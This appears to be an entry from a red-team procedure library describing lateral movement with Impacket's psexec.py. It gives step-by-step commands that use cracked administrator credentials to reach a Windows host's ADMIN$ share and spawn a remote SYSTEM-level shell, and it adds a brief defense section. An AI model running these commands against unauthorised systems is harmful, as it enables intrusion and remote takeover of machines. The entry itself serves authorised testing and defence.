---
id: 2531e058-1a98-452a-9f87-52ac02588cd8
name: psexec-authenticated-remote-shell
type: procedure
verified: true
submitted: true
created_at: '2019-12-04T20:10:15.053531+00:00'
updated_at: '2023-05-25T19:58:04.662024+00:00'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Service Execution]]'
sub_techniques: []
tags:
  - network
  - service-attacks
  - psexec
commands:
  - '[[commands/psexec-py-spawn-remote-shell]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
validated: true
---

# PSExec Authenticated Remote Shell

## Summary

This procedure uses PSExec (via Impacket) with administrative credentials to upload and execute a payload on a remote Windows host, spawning an interactive cmd shell for lateral movement.

## Description

PSExec exploits SMB ADMIN$ share to upload an executable service, starts it via SCM, and provides a shell. Requires admin rights on target; common post-credential theft for RCE in AD.

## Requirements

1. Admin creds (from cracking)
2. Impacket psexec.py
3. Target IP with port 445 open
4. Windows target (XP+)

## Defense

- Disable ADMIN$ and unnecessary shares
- Require SMB signing; block unsigned traffic
- Monitor service creation (Event ID 7045) and unusual exe uploads

## Objectives

1. Authenticate and access ADMIN$
2. Upload and start temporary service
3. Gain interactive shell

## Instructions

### Step 1: Verify Creds and Access

**Context**: Test SMB connect.

```bash
smbclient //$_TARGET_IP/ADMIN$ -U '$_DOMAIN/$_USER%$_PASS'
```

> Success: Connected prompt.

### Step 2: Execute PSExec

**Context**: Impacket handles upload/start/shell.

**Command** ([[commands/psexec-py-spawn-remote-shell]]):
```bash
psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

> Expected: 'C:\Windows\system32>' shell.

### Step 3: Interact and Exit

**Context**: Run commands; type 'help' for extras.

In shell: whoami, exit to close.
